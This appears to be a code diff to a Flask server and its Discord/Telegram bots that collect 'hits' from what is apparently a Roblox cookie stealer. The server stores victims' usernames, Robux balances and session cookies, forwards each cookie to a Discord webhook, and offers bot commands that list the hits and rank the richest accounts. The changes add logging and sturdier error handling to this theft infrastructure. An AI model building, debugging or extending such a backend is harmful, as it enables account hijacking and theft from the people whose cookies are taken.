@@ -16,9 +16,10 @@ ENABLE_TELEGRAM = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
 DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")
 API_TOKEN = os.environ.get("API_TOKEN", "123")
 
-# ---------- Internal API URL (the port is set by Render) ----------
+# ---------- Internal API URL ----------
 PORT = os.environ.get("PORT", "5000")
 API_BASE_URL = f"http://127.0.0.1:{PORT}"
+print(f"[Init] Using API base URL: {API_BASE_URL}")
 
 DB_FILE = "hits.db"
 
@@ -72,6 +73,7 @@ def get_top_robux():
 # ---------- Discord Webhook ----------
 def send_discord_webhook(hit):
     if not DISCORD_WEBHOOK_URL:
+        print("[Webhook] No URL provided – skipping.")
         return
     try:
         from discord_webhook import DiscordWebhook, DiscordEmbed
@@ -84,7 +86,8 @@ def send_discord_webhook(hit):
         embed.add_embed_field(name="Cookie", value=f"```{hit.get('cookie', 'N/A')[:50]}...```")
         embed.set_timestamp()
         webhook.add_embed(embed)
-        webhook.execute()
+        response = webhook.execute()
+        print(f"[Webhook] Sent successfully (status {response.status_code})")
     except Exception as e:
         print(f"[Webhook] Error: {e}")
 
@@ -98,7 +101,8 @@ def start_bots():
     if _bots_started:
         return
     _bots_started = True
-    time.sleep(3)  # give Flask more time to start
+    # Wait for Flask to be fully up (the first request triggers this, but wait a bit more)
+    time.sleep(5)
     if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN":
         threading.Thread(target=run_discord_bot, daemon=True).start()
         print("[Bots] Discord bot started.")
@@ -106,6 +110,7 @@ def start_bots():
         threading.Thread(target=run_telegram_bot, daemon=True).start()
         print("[Bots] Telegram bot started.")
 
+# Start bots on first request (Render's health check will trigger this)
 @app.before_request
 def before_first_request():
     start_bots()
@@ -119,6 +124,7 @@ def log_hit():
     if 'timestamp' not in data:
         data['timestamp'] = datetime.now().isoformat()
     add_hit(data)
+    # Fire webhook in background
     threading.Thread(target=send_discord_webhook, args=(data,)).start()
     return jsonify({"status": "ok"}), 200
 
@@ -160,14 +166,21 @@ def run_discord_bot():
     @bot.event
     async def on_ready():
         print(f'[Discord] Logged in as {bot.user}')
+        # Send a test message to confirm connectivity
+        try:
+            channel = bot.get_channel(123456789)  # optional: replace with your channel ID
+            # await channel.send("Bot is online!")
+        except:
+            pass
 
     @bot.command(name='howmanyhits')
     async def how_many_hits(ctx):
         try:
-            resp = requests.get(f"{API_BASE_URL}/get_hits",
-                                headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+            url = f"{API_BASE_URL}/get_hits"
+            print(f"[Discord] Fetching: {url}")
+            resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
             if resp.status_code != 200:
-                await ctx.send("Error fetching hits.")
+                await ctx.send(f"Error fetching hits (status {resp.status_code}).")
                 return
             hits = resp.json()
             if not hits:
@@ -182,28 +195,30 @@ def run_discord_bot():
                 lines.append(f"... and {total - 10} more.")
             await ctx.send("\n".join(lines))
         except Exception as e:
+            print(f"[Discord] Error: {e}")
             await ctx.send(f"Error: {e}")
 
     @bot.command(name='total')
     async def total_hits(ctx):
         try:
-            resp = requests.get(f"{API_BASE_URL}/total",
-                                headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+            url = f"{API_BASE_URL}/total"
+            resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
             if resp.status_code != 200:
-                await ctx.send("Error fetching total.")
+                await ctx.send(f"Error fetching total (status {resp.status_code}).")
                 return
             data = resp.json()
             await ctx.send(f"**Total hits recorded:** {data['total']}")
         except Exception as e:
+            print(f"[Discord] Error: {e}")
             await ctx.send(f"Error: {e}")
 
     @bot.command(name='top')
     async def top_robux(ctx):
         try:
-            resp = requests.get(f"{API_BASE_URL}/top",
-                                headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+            url = f"{API_BASE_URL}/top"
+            resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
             if resp.status_code != 200:
-                await ctx.send("Error fetching top hit.")
+                await ctx.send(f"Error fetching top hit (status {resp.status_code}).")
                 return
             data = resp.json()
             if data['username']:
@@ -211,6 +226,7 @@ def run_discord_bot():
             else:
                 await ctx.send("No hits yet.")
         except Exception as e:
+            print(f"[Discord] Error: {e}")
             await ctx.send(f"Error: {e}")
 
     @bot.command(name='commands')
@@ -237,10 +253,11 @@ def run_telegram_bot():
 
         async def how_many_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
-                resp = requests.get(f"{API_BASE_URL}/get_hits",
-                                    headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+                url = f"{API_BASE_URL}/get_hits"
+                print(f"[Telegram] Fetching: {url}")
+                resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                 if resp.status_code != 200:
-                    await update.message.reply_text("Error fetching hits.")
+                    await update.message.reply_text(f"Error fetching hits (status {resp.status_code}).")
                     return
                 hits = resp.json()
                 if not hits:
@@ -255,14 +272,15 @@ def run_telegram_bot():
                     lines.append(f"... and {total - 10} more.")
                 await update.message.reply_text("\n".join(lines))
             except Exception as e:
+                print(f"[Telegram] Error: {e}")
                 await update.message.reply_text(f"Error: {e}")
 
         async def total_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
-                resp = requests.get(f"{API_BASE_URL}/total",
-                                    headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+                url = f"{API_BASE_URL}/total"
+                resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                 if resp.status_code != 200:
-                    await update.message.reply_text("Error fetching total.")
+                    await update.message.reply_text(f"Error fetching total (status {resp.status_code}).")
                     return
                 data = resp.json()
                 await update.message.reply_text(f"Total hits recorded: {data['total']}")
@@ -271,10 +289,10 @@ def run_telegram_bot():
 
         async def top_robux(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
-                resp = requests.get(f"{API_BASE_URL}/top",
-                                    headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+                url = f"{API_BASE_URL}/top"
+                resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                 if resp.status_code != 200:
-                    await update.message.reply_text("Error fetching top hit.")
+                    await update.message.reply_text(f"Error fetching top hit (status {resp.status_code}).")
                     return
                 data = resp.json()
                 if data['username']:
@@ -302,7 +320,7 @@ def run_telegram_bot():
     except Exception as e:
         print(f"[Telegram] Bot error: {e}")
 
-# ---------- Local Development ----------
+# ---------- Main ----------
 if __name__ == "__main__":
     if len(sys.argv) > 1 and sys.argv[1] == "--server":
         init_db()
